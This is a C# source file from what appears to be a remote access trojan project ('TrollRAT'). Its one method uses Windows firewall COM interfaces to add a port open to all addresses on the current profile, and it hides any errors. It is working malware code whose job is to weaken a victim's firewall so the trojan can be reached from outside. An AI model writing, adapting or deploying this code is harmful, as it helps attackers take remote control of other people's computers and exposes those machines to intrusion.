using System;

using NetFwTypeLib;

namespace TrollRAT.Utils
{
    class Firewall
    {
        public static bool openPort(string name, int port, NET_FW_IP_PROTOCOL_ protocol)
        {
            try
            {
                Type opType = Type.GetTypeFromProgID("HNetCfg.FWOpenPort");
                INetFwOpenPort openPort = Activator.CreateInstance(opType) as INetFwOpenPort;

                openPort.Name = name;
                openPort.Port = port;
                openPort.Protocol = protocol;
                openPort.Scope = NET_FW_SCOPE_.NET_FW_SCOPE_ALL;
                openPort.IpVersion = NET_FW_IP_VERSION_.NET_FW_IP_VERSION_ANY;

                Type managerType = Type.GetTypeFromCLSID(new Guid("{304CE942-6E39-40D8-943A-B913C40C9CD4}"));
                INetFwMgr manager = Activator.CreateInstance(managerType) as INetFwMgr;

                manager.LocalPolicy.CurrentProfile.GloballyOpenPorts.Add(openPort);
            } catch (Exception)
            {
                return false;
            }

            return true;
        }
    }
}
